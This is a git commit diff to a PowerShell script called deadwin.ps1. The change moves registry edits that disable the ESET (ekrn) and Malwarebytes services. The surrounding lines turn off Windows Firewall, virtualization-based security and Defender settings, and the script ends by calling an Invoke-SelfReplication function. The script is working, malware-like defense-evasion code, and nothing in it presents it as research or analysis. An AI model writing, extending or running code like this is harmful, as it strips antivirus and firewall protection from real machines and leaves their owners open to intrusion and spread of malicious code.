6ebf86ce098208f3c5ac02ae4f51a002d69ad29e
Pancracio <38768857+Chapelo@users.noreply.github.com>
2024-08-03 21:03:26 +0200

    Update deadwin.ps1

--- deadwin.ps1
+++ deadwin.ps1
@@ -155,6 +155,11 @@ Set-RegistryProperties -path $realTimeProtectionKey -properties @{
     "SubmitSamplesConsent" = 2
 }
 
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ekrn" -Name "Start" -Value 4;
+
+
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\MBAMService" -Name "Start" -Value 4;
+
 # Disable Windows Firewall
 Set-RegistryProperties -path "$firewallPath\DomainProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}
 Set-RegistryProperties -path "$firewallPath\StandardProfile" -properties @{"EnableFirewall" = 0; "DisableNotifications" = 1}
@@ -221,18 +226,8 @@ Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -prope
 # Disable Virtualization Based Security
 Set-RegistryProperties -path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -properties @{"EnableVirtualizationBasedSecurity" = 0; "RequirePlatformSecurityFeatures" = 0}
 
-Stop-Service -Name "ekrn" -Force;
-Set-Service -Name "ekrn" -StartupType Disabled;
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\ekrn" -Name "Start" -Value 4;
 
-# Detener y deshabilitar Malwarebytes
-Stop-Service -Name "MBAMService" -Force;
-Set-Service -Name "MBAMService" -StartupType Disabled;
-Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\MBAMService" -Name "Start" -Value 4;
 
-# Terminar procesos si siguen activos
-Stop-Process -Name "ekrn" -Force -ErrorAction SilentlyContinue;
-Stop-Process -Name "mbamservice" -Force -ErrorAction SilentlyContinue;
 
 # Call the Invoke-SelfReplication function
 Invoke-SelfReplication
